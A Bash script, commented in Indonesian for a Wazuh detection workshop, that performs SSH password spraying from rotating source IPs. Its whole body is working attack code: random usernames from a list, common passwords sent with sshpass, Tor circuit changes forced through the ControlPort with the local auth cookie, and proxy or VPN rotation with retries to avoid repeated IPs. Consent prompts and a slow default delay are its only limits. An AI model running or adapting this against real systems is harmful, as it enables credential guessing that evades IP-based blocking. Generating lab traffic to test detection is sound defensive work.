#!/usr/bin/env bash
# =============================================================================
# simulate_bruteforce_v3.4.2.sh — Simulasi distributed SSH brute force untuk LAB
# bagian dari workshop Wazuh (Attack 3: Brute Force SSH - Kasus Nyata)
#
# KONVENSI FILE:
#   Nama file membawa versi: simulate_bruteforce_v<MAJOR.MINOR.PATCH>.sh
#   'simulate_bruteforce.sh' adalah symlink ke versi terbaru
#   (panggil salah satu sama saja).
#
# VERSION: 3.4.3 (2026-10-06)
# CHANGELOG:
#   v3.4.3 — FIX NEWNYM COOKIE PATH + FIX CIRCUIT MISMATCH [FIX-7][FIX-8]
#     Temuan tes v3.4.2 di OpenCloudOS (tor 0.4.8, service toranon):
#     (1) Cookie file bernama control_auth_cookie (underscore) di
#         /var/lib/tor/, script cari 'control_authcookie' -> NEWNYM selalu
#         fallback SIGHUP. Sekarang cari kedua nama + verifikasi AUTHENTICATE.
#     (2) IP yang dilaporkan script (curl check) BERBEDA dari IP yang
#         tercatat di log server: circuit Tor berganti di antara curl dan
#         ssh (torsocks per-proses, bukan satu sesi persisten). Solusi:
#         cek IP DI DALAM blok torsocks yang sama dengan ssh, SEBELUM
#         ssh dijalankan, dan catat sebagai IP sumber resmi iterasi ini.
#   v3.4.2 — NEWNYM COOKIE HEX + MULTI-LOKASI COOKIE + deteksi "tor sudah jalan"
#             (cookie dikirim dalam HEX sesuai protokol kontrol Tor; pencarian
#             cookie di /run, /var/run, /var/lib/tor, ~/.tor; pgrep gagal tapi
#             port 9050 hidup = anggap tor jalan)
#   v3.4.0 — VERIFY-LOG HANYA DI SERVER + ANTI-CRASH [FIX-5][FIX-6]
#     Temuan tes v3.3 dari WSL: (1) --verify-log membaca log LOKAL WSL
#     (auth.log) padahal target server (verifikasi palsu); (2) script mati
#     diam-diam setelah iterasi 1 karena grep no-match + set -e.
#     Perbaikan:
#     - verify-log otomatis DIMATIKAN (dengan penjelasan) bila --host bukan
#       mesin ini (localhost/127.x/IP lokal via hostname -I)
#     - semua grep di jalur verifikasi diberi '|| true' — "tidak ketemu"
#       adalah hasil normal, bukan crash
#     - label log diperjelas: "log server ini"
#   v3.3.0 — KEJUJURAN KLAIM STATUS [FIX-4]
#     Temuan tes v3.2: "Permission denied" tidak dijamin berarti server
#     mencatat (penolakan bisa terjadi di level jaringan, 3 dari 5 iterasi
#     tidak ada di /var/log/secure). Perubahan:
#     - Tanpa --verify-log: status = "auth ditolak — BELUM diverifikasi"
#     - Dengan --verify-log: status final dari bukti log server
#     - Ringkasan: label hitungan menyesuaikan (terverifikasi vs belum)
#   v3.2.0 — NEWNYM ANDAL + AUTO-RETRY + ANTI-DUPLIKAT IP
#     [NEW-1] NEWNYM via ControlPort (bukan SIGHUP): kirim 'SIGNAL NEWNYM'
#             ke 127.0.0.1:9051 dengan autentikasi cookie -> circuit BENAR-
#             BENAR baru. Fallback ke SIGHUP jika ControlPort tidak aktif,
#             dengan petunjuk cara mengaktifkannya di torrc.
#     [NEW-2] --retries N (default 2): jika ssh TIDAK SAMPAI (rc=255 tanpa
#             Permission denied), ganti circuit lalu coba ulang otomatis.
#     [NEW-3] Anti-duplikat exit: jika IP baru == IP sebelumnya, ganti circuit
#             lagi (maks 3 percobaan) agar demo "banyak IP berbeda" nyata.
#     [NEW-4] Ringkasan akhir berbentuk tabel: iterasi | IP | user | status,
#             plus hitungan tercatat vs tidak-sampai.
#   v3.1.0 — Klasifikasi rc diperbaiki: stderr ssh digabung (2>&1) di blok tor
#            sehingga "Permission denied" terdeteksi; iterasi yang benar-benar
#            sampai server kini [ok] "auth ditolak". Urutan output: ssh -> rc -> IP.
#   v3.0.0 — [FIX-1] curl+ssh dalam SATU sesi torsocks (circuit sama);
#            [FIX-2] --verify-log cek log server; [FIX-3] error ssh transparan.
#   v2.1.0 — password diacak dari wordlist umum (password spraying)
#   v2.0.0 — dash-to-bash guard (sh -> bash otomatis)
#   v1.0.0 — versi awal (tor/proxy/vpn, user acak)
#
# CARA KERJA:
#   - Setiap iterasi: ganti circuit Tor (NEWNYM via ControlPort), pastikan IP
#     baru berbeda dari sebelumnya, lalu SATU percobaan ssh (user acak +
#     password umum, pasti gagal). curl dan ssh dalam SATU sesi torsocks
#     sehingga IP yang ditampilkan = IP yang benar-benar dipakai ssh.
#   - Kalau ssh tidak sampai (exit node bermasalah/diblokir), otomatis ganti
#     circuit dan ulangi (maks --retries kali per iterasi).
#
# CARA GANTI IP (pilih via opsi):
#   --mode tor          : Tor + torsocks (IP berubah tiap NEWNYM)  [paling mudah]
#   --mode proxy        : daftar proxy HTTP/SOCKS5 di file         [butuh daftar]
#   --mode vpn          : openvpn config banyak file + system      [butuh setup]
#
# AKTIFKAN CONTROLPORT (agar NEWNYM andal) — /etc/tor/torrc:
#   ControlPort 9051
#   CookieAuthentication 1
#   lalu restart tor: sudo systemctl restart tor
#   (tanpa ini, script otomatis fallback ke SIGHUP yang kurang andal)
#
# KEAMANAN & ETIKA:
#   - HANYA untuk lab milik sendiri. Menyerang sistem orang lain tanpa izin
#     adalah ILEGAL (UU ITE / UU PDP / hukum komputer setempat).
#   - Sengaja lambat (default 8 detik antar percobaan) agar tak bisa
#     disalahgunakan sebagai alat serangan serius.
#
# USAGE:
#   sudo apt install -y tor torsocks sshpass curl
#   chmod +x simulate_bruteforce_v3.2.0.sh
#   ./simulate_bruteforce_v3.2.0.sh --host 203.0.113.10 --count 5 --mode tor
#   # + verifikasi log server (jika script berjalan di server sendiri):
#   ./simulate_bruteforce_v3.2.0.sh --host 203.0.113.10 --verify-log
#
# EXIT CODES: 0 sukses, 1 argumen salah, 2 dependensi kurang
# =============================================================================
VERSION="3.5.0"

# dash guard: 'sh script.sh' di Ubuntu = dash; pindah ke bash otomatis
if [ -z "${BASH_VERSION:-}" ]; then
  exec bash "$0" "$@"
fi

set -euo pipefail

# ---------- default ----------
MODE="tor"
HOST=""
PORT="22"
COUNT="5"
SLEEP_BETWEEN=8
PROXY_FILE="proxies.txt"
VPN_DIR="./vpn-configs"
VERIFY_LOG=0
SSH_TIMEOUT=15
RETRIES=2
TOR_CONTROL_PORT=9051
LAST_IP=""          # untuk anti-duplikat IP antar iterasi (indikasi)
LAST_TS=""          # [FIX-9] timestamp unix ssh terakhir (anchor log server)
LOG_FILE=""

USERS=("admin" "kafka" "serv" "ubuntu" "root" "test" "oracle" "postgres" "user1" "guest" "pi" "deploy")
# Password umum ala wordlist bot nyata (teknik "password spraying").
# Semua PASTI gagal karena tidak ada yang cocok dengan password server lab.
PASSWORDS=("123456" "password" "admin" "123456789" "12345678" "qwerty"
           "abc123" "111111" "123123" "admin123" "root" "toor" "letmein")

# ringkasan akhir: iterasi,ip,user,status
SUMMARY=()

# ---------- helpers ----------
log()     { printf '\033[1;34m[info]\033[0m  %s\n' "$*"; }
ok()      { printf '\033[1;32m[ok]\033[0m    %s\n' "$*"; }
warn()    { printf '\033[1;33m[warn]\033[0m  %s\n' "$*"; }
die()     { printf '\033[1;31m[err]\033[0m   %s\n' "$*" >&2; exit 1; }

usage() {
  cat <<EOF
simulate_bruteforce.sh v${VERSION} — demo brute force untuk LAB (wajib izin)

Usage: $0 --host <ip-server-lab> [opsi]

  --host        IP/hostname server lab (WAJIB)
  --port        port SSH target (default: 22)
  --count       jumlah iterasi / percobaan (default: 5)
  --mode        tor | proxy | vpn (default: tor)
  --sleep       jeda antar percobaan detik (default: 8)
  --retries     maks ulangan otomatis per iterasi bila ssh tak sampai (default: 2)
  --verify-log  cek log server apakah percobaan benar-benar tercatat
                (butuh akses baca /var/log/secure atau /var/log/auth.log)
  --ssh-timeout timeout ssh per percobaan detik (default: 15)
  --proxies     file daftar proxy "http://ip:port"/"socks5://ip:port"
                (untuk --mode proxy, default: proxies.txt)
  --vpndir      folder berisi file .ovpn (untuk --mode vpn, default: ./vpn-configs)
  --version     tampilkan versi
  -h, --help    tampilkan bantuan
EOF
  exit 1
}

# ---------- parse args ----------
while [[ $# -gt 0 ]]; do
  case "$1" in
    --host)        HOST="$2"; shift 2 ;;
    --port)        PORT="$2"; shift 2 ;;
    --count)       COUNT="$2"; shift 2 ;;
    --mode)        MODE="$2"; shift 2 ;;
    --sleep)       SLEEP_BETWEEN="$2"; shift 2 ;;
    --retries)     RETRIES="$2"; shift 2 ;;
    --verify-log)  VERIFY_LOG=1; shift ;;
    --ssh-timeout) SSH_TIMEOUT="$2"; shift 2 ;;
    --proxies)     PROXY_FILE="$2"; shift 2 ;;
    --vpndir)      VPN_DIR="$2"; shift 2 ;;
    --version)     echo "simulate_bruteforce.sh v${VERSION}"; exit 0 ;;
    -h|--help)     usage ;;
    *) die "argumen tidak dikenal: $1 (lihat --help)" ;;
  esac
done

[[ -n "$HOST" ]] || { usage; }
[[ "$MODE" =~ ^(tor|proxy|vpn)$ ]] || die "mode harus: tor | proxy | vpn"
(( COUNT >= 1 )) || die "count minimal 1"
(( RETRIES >= 0 )) || die "retries minimal 0"

# ---------- banner etika ----------
cat <<'BANNER'
====================================================================
  SIMULASI BRUTE FORCE — KHUSUS LAB MILIK SENDIRI
  Pastikan Anda MEMILIKI izin atas server target.
  Menyerang sistem orang lain tanpa izin = ILEGAL.
====================================================================
BANNER
read -r -p "Ketik 'SAYA PUNYA IZIN' untuk lanjut: " CONFIRM
[[ "$CONFIRM" == "SAYA PUNYA IZIN" ]] || die "konfirmasi tidak sesuai, batal."

# ---------- dependensi ----------
need() { command -v "$1" >/dev/null 2>&1 || die "butuh '$1' — install dulu."; }
need ssh
need curl
need sshpass

# ---------- [NEW-1] NEWNYM andal via ControlPort ----------
tor_newnym() {
  local port="$TOR_CONTROL_PORT" cookie hex resp

  # cari cookie di lokasi umum (tor bisa jalan sebagai service ATAU user biasa)
  # [FIX-7] OpenCloudOS/RHEL: /var/lib/tor/control_auth_cookie (DENGAN underscore
  # antara auth dan cookie). Debian: /var/run/tor/control.authcookie. Tambahkan
  # keduanya + varian lama.
  local cookie_path=""
  for cp in /run/tor/control.authcookie /var/run/tor/control.authcookie \
            /var/lib/tor/control_auth_cookie /var/lib/tor/control_authcookie \
            "$HOME/.tor/control_authcookie" /var/lib/tor/control.authcookie; do
    [[ -r "$cp" ]] && { cookie_path="$cp"; break; }
  done

  if [[ -n "$cookie_path" ]]; then
    # Tor mengharapkan cookie dalam HEX (bukan string mentah!)
    hex=$(xxd -p "$cookie_path" 2>/dev/null | tr -d '\n')
    if [[ -n "$hex" ]]; then
      resp=$(printf 'AUTHENTICATE %s\nSIGNAL NEWNYM\nQUIT\n' "$hex" \
        | timeout 8 nc 127.0.0.1 "$port" 2>/dev/null || true)
      if echo "$resp" | grep -q "^250 OK"; then
        ok "circuit baru diminta (NEWNYM via ControlPort :$port, cookie: $cookie_path)"
        sleep 4   # waktu untuk membangun circuit segar
        return 0
      fi
    fi
  fi

  # fallback: SIGHUP (kurang andal, kadang tidak mengganti exit node)
  log "ControlPort :$port tidak tersedia/cookie tidak ketemu — fallback SIGHUP"
  pkill -HUP -x tor 2>/dev/null || true
  sleep 4
  warn "agar IP selalu berganti, pastikan di /etc/tor/torrc:"
  warn "  ControlPort ${port}"
  warn "  CookieAuthentication 1"
  warn "  lalu restart tor (sudo systemctl restart tor / matikan semua 'tor &' lalu jalankan lagi)"
  return 0
}

# ---------- [NEW-3] pastikan IP baru != IP sebelumnya ----------
tor_fresh_ip() {
  local ip="" tries=0
  while (( tries < 3 )); do
    ip=$(torsocks -q curl -s --max-time 12 https://api.ipify.org 2>/dev/null || echo "")
    [[ -z "$ip" ]] && ip="(tidak terdeteksi)"
    if [[ "$ip" != "$LAST_IP" ]]; then
      echo "$ip"
      return 0
    fi
    tries=$((tries+1))
    warn "IP masih sama ($ip) — minta circuit baru lagi ($tries/3)..."
    tor_newnym
  done
  echo "$ip"   # ya sudah, pakai yang ini saja
}

# ---------- blok torsocks: ssh DI DALAM circuit (FIX-1, tetap dipakai) ----------
# [FIX-8] IP check DIPINDAH ke DALAM blok ini, SEBELUM ssh, dalam torsocks
# session YANG SAMA. Alasan: circuit Tor bisa berganti di antara proses;
# curl check terpisah = IP yang dilaporkan != IP yang sampai ke server
# (temuan tes v3.4.2: 4 dari 5 iterasi IP laporan != IP di log server).
tor_ssh_block() {
  local user="$1" password="$2"

  torsocks -q bash <<EOF_TORBLOCK 2>&1
set +e
IP=\$(curl -s --max-time 12 https://api.ipify.org)
[ -z "\$IP" ] && IP="(tidak terdeteksi)"
echo "[info]  indikasi IP exit node (bukan kepastian): \$IP"  # Tor bisa ganti circuit utk ssh
echo "[info]  ssh ${user}@${HOST}:${PORT} dengan password '${password}' (pasti salah)"
echo "__TS__=\$(date +%s)"   # timestamp unix utk matching log server
sshpass -p '${password}' ssh \\
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o ConnectTimeout=${SSH_TIMEOUT} -o PreferredAuthentications=password \\
  -o NumberOfPasswordPrompts=1 -o BatchMode=no \\
  -p ${PORT} ${user}@${HOST} exit
RC=\$?
echo "[debug] ssh return code: \$RC"
echo "__RC__=\$RC"
echo "__INDIP__=\$IP"
EOF_TORBLOCK
}

# ---------- klasifikasi hasil ([FIX-3]) ----------
# output: mencetak log blok; return 0 = sampai & ditolak (sukses demo)
#         return 1 = tidak sampai (perlu retry)
interpret_ssh_block() {
  local out="$1" rc
  echo "$out"
  rc=$(echo "$out" | grep -o '__RC__=[0-9]*' | cut -d= -f2 | tail -1)
  rc=${rc:-255}

  case "$rc" in
    0)
      warn "ssh SUKSES?! seharusnya gagal — cek target, mungkin password benar"
      return 0
      ;;
    5)
      ok "auth ditolak (rc=5) — kemungkinan besar tercatat (verifikasi: --verify-log)"
      return 0
      ;;
    255)
      if echo "$out" | grep -q "Permission denied"; then
        if (( VERIFY_LOG == 1 )); then
          ok "auth ditolak (Permission denied) — status akhir menunggu cek log server"
        else
          ok "auth ditolak (Permission denied) — BELUM diverifikasi di log server"
          warn "jalankan dengan --verify-log di server untuk bukti nyata"
        fi
        return 0
      fi
      warn "ssh TIDAK SAMPAI ke server (rc=255, bukan penolakan auth):"
      echo "$out" | grep -viE "__RC__|__INDIP__|__TS__|indikasi IP exit|ssh .*password|return code|Permanently added" \
        | sed 's/^/        /' | head -4
      return 1
      ;;
    *)
      warn "ssh keluar dengan rc=$rc (tidak standar) — dianggap tidak sampai"
      return 1
      ;;
  esac
}

# ---------- [NEW-2] satu iterasi lengkap dengan retry ----------
do_tor_iteration() {
  local user="$1" password="$2" attempt=0 out ip ts rc_flag
  while (( attempt <= RETRIES )); do
    attempt=$((attempt+1))
    if (( attempt > 1 )); then
      warn "percobaan ulang $((attempt-1))/${RETRIES} — ganti circuit dulu..."
      tor_newnym
    fi

    out=$(tor_ssh_block "$user" "$password") || true
    if interpret_ssh_block "$out"; then
      # [FIX-9] IP indikasi (bukan kepastian) + timestamp untuk matching log server
      ip=$(echo "$out" | grep -o '__INDIP__=.*' | cut -d= -f2- | tail -1)
      ts=$(echo "$out" | grep -o '__TS__=[0-9]*' | cut -d= -f2 | tail -1)
      LAST_IP="$ip"          # indikasi
      LAST_TS="$ts"          # ground-truth anchor
      return 0
    fi
  done
  ip=$(echo "$out" | grep -o '__INDIP__=.*' | cut -d= -f2- | tail -1)
  ts=$(echo "$out" | grep -o '__TS__=[0-9]*' | cut -d= -f2 | tail -1)
  LAST_IP="$ip"
  LAST_TS="$ts"
  return 1
}

# ---------- [FIX-9] IP GROUND-TRUTH dari log server ----------
# Tor circuit bisa berganti antara curl check dan ssh -> klaim IP curl tidak
# andal. Satu-satunya kebenaran: log sshd server target. Cocokkan entry log
# berdasarkan rentang waktu (±90 detik dari timestamp ssh) + user target.
# Berlaku penuh hanya jika target = mesin ini (log bisa dibaca langsung).
find_true_ip_from_log() {
  local user="$1" ts="$2" line ip
  [[ -n "$LOG_FILE" && -n "$ts" ]] || return 1
  # [PERF] jangan awk seluruh log (859rb baris) — pre-filter string timestamp
  # dulu dengan sed/grep (cepat), baru parse segmen kecil
  local lo hi
  lo=$((ts-10)); hi=$((ts+60))   # sempit: sshd mencatat <2s setelah percobaan
  # [PERF+PRECISION] bandingkan timestamp ISO secara LEXIKAL (tanpa date per baris):
  #   lo_iso <= log_ts <= hi_iso, di mana log_ts dipotong sampai detik.
  # Ambil baris PERTAMA yang cocok (paling dekat dengan ssh).
  local lo_iso hi_iso
  lo_iso=$(date -d "@$lo" "+%Y-%m-%dT%H:%M:%S" 2>/dev/null)
  hi_iso=$(date -d "@$hi" "+%Y-%m-%dT%H:%M:%S" 2>/dev/null)
  [[ -z "$lo_iso" || -z "$hi_iso" ]] && return 1
  line=$(awk -v lo="$lo_iso" -v hi="$hi_iso" -v u="$user" '
    /^2026-/ && /sshd/ {
      ts=substr($0,1,19)              # 2026-10-06T10:22:35
      if (ts>=lo && ts<=hi) {
        if ($0 ~ ("Failed password for( invalid user)? " u " from") ||
            $0 ~ ("Invalid user " u " from")) {
          if (match($0,/from [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/)) {
            print substr($0,RSTART+5,RLENGTH-5); exit
          }
        }
      }
    }' "$LOG_FILE" 2>/dev/null || true)
  line=${line#from }
  [[ -n "$line" ]] && { echo "$line"; return 0; }
  return 1
}

# ---------- [FIX-2]+[FIX-5] verifikasi log HANYA jika script di server target ----------
# Temuan tes v3.3: --verify-log dijalankan dari WSL membaca log LOKAL WSL
# (/var/log/auth.log), bukan log server target -> verifikasi palsu.
# Aturan baru: verify-log hanya boleh jalan kalau HOST adalah mesin ini
# (localhost/127.x/IP lokal), ATAU IP target terdeteksi sebagai IP kita sendiri.
LOCAL_IPS=$(hostname -I 2>/dev/null || echo "")

# [BUGFIX v3.5.0] find_log hilang di v3.4.2/v3.4.3 (regresi) — dikembalikan
find_log() {
  for f in /var/log/secure /var/log/auth.log; do
    [[ -r "$f" ]] && { LOG_FILE="$f"; return 0; }
  done
  return 1
}

# [FIX-9] deteksi "target = publik IP mesin ini" via curl tanpa proxy
# (temuan tes v3.5.0: hostname -I hanya berisi IP privat, target pakai IP
#  publik 43.157.207.164 -> guard menolak padahal target = mesin ini)
is_target_this_machine() {
  case "$HOST" in
    localhost|127.0.0.1|::1) return 0 ;;
  esac
  if [[ -n "$LOCAL_IPS" ]] && echo " $LOCAL_IPS " | grep -q " $HOST "; then
    return 0
  fi
  # bandingkan dengan public IP mesin ini (sekali saja, cache)
  if [[ -z "${MY_PUB_IP:-}" ]]; then
    MY_PUB_IP=$(curl -s --max-time 8 https://api.ipify.org 2>/dev/null || echo "?")
  fi
  [[ "$MY_PUB_IP" == "$HOST" ]] && return 0
  return 1
}

verify_log() {
  local user="$1" ip="$2" hit
  if [[ -z "$LOG_FILE" ]]; then
    warn "verify-log: log tidak tersedia — dilewati"
    return 1
  fi
  # guard anti-grep-crash: "tidak ketemu" adalah hasil NORMAL, bukan error
  if [[ "$ip" == "?" || -z "$ip" || "$ip" == *tidak* ]]; then
    hit=$(grep -E "Failed password.*${user} |Invalid user ${user} " "$LOG_FILE" 2>/dev/null | tail -1 || true)
  else
    hit=$(grep -E "(${ip}).*(${user})|(${user}).*from (${ip})" "$LOG_FILE" 2>/dev/null | tail -1 || true)
    if [[ -z "$hit" ]]; then
      hit=$(grep -E "${ip}" "$LOG_FILE" 2>/dev/null | grep -i "sshd" | tail -1 || true)
    fi
  fi
  if [[ -n "$hit" ]]; then
    ok "TERKONFIRMASI di ${LOG_FILE} (log server):"
    echo "        $hit"
    return 0
  else
    warn "TIDAK ketemu di ${LOG_FILE} (user=${user}, ip=${ip}) — koneksi mungkin tidak sampai"
    return 1
  fi
}

# ---------- mode: TOR ----------
setup_tor() {
  need torsocks
  need tor
  if ! pgrep -x tor >/dev/null 2>&1; then
    log "tor belum jalan — coba service manager dulu..."
    if command -v systemctl >/dev/null 2>&1 && sudo -n systemctl start tor 2>/dev/null; then
      sleep 3
    elif sudo service tor start 2>/dev/null; then
      sleep 3
    elif sudo -n systemctl start tor 2>/dev/null; then
      sleep 3
    else
      log "service gagal/needs password — coba 'sudo tor' langsung..."
      (sudo tor >/tmp/tor-lab.log 2>&1 &) || true
      sleep 6
    fi
  fi
  if ! pgrep -x tor >/dev/null 2>&1; then
    # kasus umum: "Address already in use" = tor SEBENARNYA sudah jalan
    if nc -z 127.0.0.1 9050 2>/dev/null; then
      ok "tor sudah berjalan (port 9050 merespons, proses lama dikenali)"
      return 0
    fi
    warn "tor gagal jalan otomatis. diagnosa:"
    warn "  1) jalankan manual utk lihat error : sudo tor   (ctrl+c setelah '100%')"
    warn "  2) atau via service                : sudo systemctl start tor / sudo service tor start"
    warn "  3) log percobaan terakhir          : tail -20 /tmp/tor-lab.log"
    die "tor tidak berjalan — perbaiki dulu lalu ulangi script"
  fi
  ok "tor berjalan (SOCKS5 127.0.0.1:9050)"
}

# ---------- mode: PROXY ----------
setup_proxy() {
  [[ -f "$PROXY_FILE" ]] || die "file proxy '$PROXY_FILE' tidak ada.
  Isi satu proxy per baris, contoh:
    http://1.2.3.4:8080
    socks5://5.6.7.8:1080"
  PROXIES=($(grep -v '^#' "$PROXY_FILE" | grep -v '^$'))
  (( ${#PROXIES[@]} >= 1 )) || die "file proxy kosong."
  ok "terbaca ${#PROXIES[@]} proxy dari $PROXY_FILE"
}

proxy_cur_ip() {
  local p="$1"
  curl -s --max-time 10 -x "$p" https://api.ipify.org 2>/dev/null || echo "?"
}

# ---------- mode: VPN ----------
setup_vpn() {
  command -v openvpn >/dev/null 2>&1 || die "openvpn tidak ada. install: sudo apt install -y openvpn"
  VPN_LIST=($(find "$VPN_DIR" -maxdepth 1 -name '*.ovpn' 2>/dev/null | sort))
  (( ${#VPN_LIST[@]} >= 2 )) || die "butuh minimal 2 file .ovpn di $VPN_DIR"
  ok "terbaca ${#VPN_LIST[@]} config vpn di $VPN_DIR"
}

vpn_up() {
  local conf="$1"
  log "hubungkan vpn: $(basename "$conf")"
  sudo openvpn --config "$conf" --daemon --log /tmp/openvpn-lab.log
  sleep 6  # tunggu handshake
}

vpn_down() {
  sudo pkill -f 'openvpn.*--daemon' 2>/dev/null || true
  sleep 2
}

cur_ip() { curl -s --max-time 10 https://api.ipify.org 2>/dev/null || echo "?"; }

# vpn/proxy: satu iterasi ssh biasa (dengan interpretasi rc yang sama)
plain_ssh() {
  local user="$1" password="$2" label="$3" rc out
  log "ssh $user@${HOST}:${PORT} dengan password '$password' (pasti salah)"
  set +e
  out=$(sshpass -p "$password" ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=$SSH_TIMEOUT -o PreferredAuthentications=password \
    -o NumberOfPasswordPrompts=1 -o BatchMode=no \
    -p "$PORT" "$user@$HOST" exit 2>&1)
  rc=$?
  set -e
  echo "$out" | head -3 | sed 's/^/        /'
  if (( rc == 0 )); then
    warn "ssh SUKSES?! seharusnya gagal — cek target"
    return 0
  elif echo "$out" | grep -q "Permission denied"; then
    if (( VERIFY_LOG == 1 )); then
      ok "auth ditolak (Permission denied) — status akhir menunggu cek log server"
    else
      ok "auth ditolak (Permission denied) — BELUM diverifikasi di log server"
    fi
    return 0
  else
    warn "ssh TIDAK SAMPAI (rc=$rc) — $label"
    return 1
  fi
}

# ---------- main loop ----------
case "$MODE" in
  tor)   setup_tor ;;
  proxy) setup_proxy ;;
  vpn)   setup_vpn ;;
esac

if (( VERIFY_LOG == 1 )); then
  if is_target_this_machine; then
    if find_log; then
      ok "verify-log aktif, membaca log server ini: $LOG_FILE"
    else
      warn "verify-log diminta tapi log server tidak bisa dibaca (coba sudo?) — dilewati"
      VERIFY_LOG=0
    fi
  else
    warn "verify-log DIMATIKAN: --host '$HOST' bukan mesin ini."
    warn "Log yang bisa dibaca di sini adalah log LOKAL, bukan log server target"
    warn "(bug v3.3: verifikasi palsu). Jalankan script DARI server dengan"
    warn "--host localhost --verify-log, atau verifikasi manual di server:"
    warn "  sudo grep '<IP-iterasi>' /var/log/secure /var/log/auth.log"
    warn "atau lihat di Wazuh Dashboard (tugasnya memang mengumpulkan log)."
    VERIFY_LOG=0
  fi
fi

log "mulai $COUNT iterasi, mode=$MODE, target=$HOST:${PORT}, retries=${RETRIES}, versi=${VERSION}"

# [FIX-9] ground-truth IP: log server SELALU dibaca bila target = mesin ini,
# terlepas dari --verify-log (IP asli dibutuhkan untuk ringkasan akurat)
GROUND_TRUTH=0
if [[ "$MODE" == "tor" ]] && is_target_this_machine && find_log; then
  GROUND_TRUTH=1
  ok "ground-truth IP aktif: baca log server $LOG_FILE setelah tiap ssh"
fi
echo ""

ARRIVED=0; MISSED=0; VERIFIED=0
for (( i=1; i<=COUNT; i++ )); do
  echo "----- iterasi $i / $COUNT -----"

  # 1) pilih kredensial acak (ala wordlist bot nyata)
  U="${USERS[$((RANDOM % ${#USERS[@]}))]}"
  PW="${PASSWORDS[$((RANDOM % ${#PASSWORDS[@]}))]}"
  log "target kredensial: user=$U password=***"

  STATUS="?"
  case "$MODE" in
    tor)
      # 2) ganti circuit (NEWNYM andal) + anti-duplikat IP
      tor_newnym
      # 3) ssh + retry otomatis
      if do_tor_iteration "$U" "$PW"; then
        STATUS="auth ditolak"; ARRIVED=$((ARRIVED+1))
      else
        STATUS="tidak sampai (setelah ${RETRIES}x retry)"; MISSED=$((MISSED+1))
      fi
      IP="${LAST_IP}"
      ;;
    proxy)
      P="${PROXIES[$(( (i-1) % ${#PROXIES[@]} ))]}"
      IP=$(proxy_cur_ip "$P")
      ok "public IP sesi ini: $IP (via proxy)"
      if plain_ssh "$U" "$PW" "proxy HTTP/SOCKS butuh proxychains"; then
        STATUS="auth ditolak"; ARRIVED=$((ARRIVED+1))
      else
        STATUS="tidak sampai"; MISSED=$((MISSED+1))
      fi
      ;;
    vpn)
      vpn_down
      VPN_CHOOSE="${VPN_LIST[$(( (i-1) % ${#VPN_LIST[@]} ))]}"
      vpn_up "$VPN_CHOOSE"
      IP=$(cur_ip)
      ok "public IP sesi ini: $IP (via vpn: $(basename "$VPN_CHOOSE"))"
      if plain_ssh "$U" "$PW" "cek config vpn"; then
        STATUS="auth ditolak"; ARRIVED=$((ARRIVED+1))
      else
        STATUS="tidak sampai"; MISSED=$((MISSED+1))
      fi
      ;;
  esac

  # 4) [FIX-9] IP ground-truth dari log server (jika target = mesin ini)
  if (( GROUND_TRUTH == 1 )) && [[ "$MODE" == "tor" ]]; then
    sleep 1   # beri waktu sshd menulis log
    TRUE_IP=$(find_true_ip_from_log "$U" "${LAST_TS:-0}" || echo "")
    if [[ -n "$TRUE_IP" ]]; then
      ok "IP ASLI di log server: $TRUE_IP (untuk user=$U)"
      IP="$TRUE_IP"   # ganti IP indikasi dengan IP pasti
      STATUS="auth ditolak (terverifikasi log)"
      VERIFIED=$((VERIFIED+1))
    else
      warn "IP asli belum ketemu di log server — pakai indikasi: $IP"
    fi
  fi

  # 5) verifikasi log (opsional)
  if (( VERIFY_LOG == 1 )); then
    verify_log "$U" "$IP"
  fi

  SUMMARY+=("$i|$IP|$U|$STATUS")

  # 5) jeda antar iterasi
  if (( i < COUNT )); then
    log "tunggu ${SLEEP_BETWEEN}s..."
    sleep "$SLEEP_BETWEEN"
  fi
  echo ""
done

# ---------- [NEW-4] ringkasan akhir ----------
echo "=============================================="
echo "  RINGKASAN (v${VERSION})"
echo "=============================================="
printf '%-8s %-22s %-10s %s\n' "Iterasi" "IP" "User" "Status"
for row in "${SUMMARY[@]}"; do
  IFS='|' read -r it ip us st <<< "$row"
  printf '%-8s %-22s %-10s %s\n' "$it" "$ip" "$us" "$st"
done
echo "----------------------------------------------"
if (( VERIFY_LOG == 1 )); then
  echo "  Auth ditolak & TERVERIFIKASI di log : $ARRIVED"
else
  if (( GROUND_TRUTH == 1 )); then
    echo "  Auth ditolak (terverifikasi di log server): $VERIFIED dari $ARRIVED"
  else
    echo "  Auth ditolak (belum diverifikasi di log): $ARRIVED"
  fi
fi
echo "  Tidak sampai       : $MISSED"
echo "=============================================="
ok "cek di Wazuh Dashboard:"
echo "  Discover -> filter: rule.groups:authentication_failed"
echo "             atau rule.mitre.technique:Password Guessing"
echo "  Perhatikan: banyak IP berbeda, tiap IP 1-2 percobaan."
echo "=============================================="
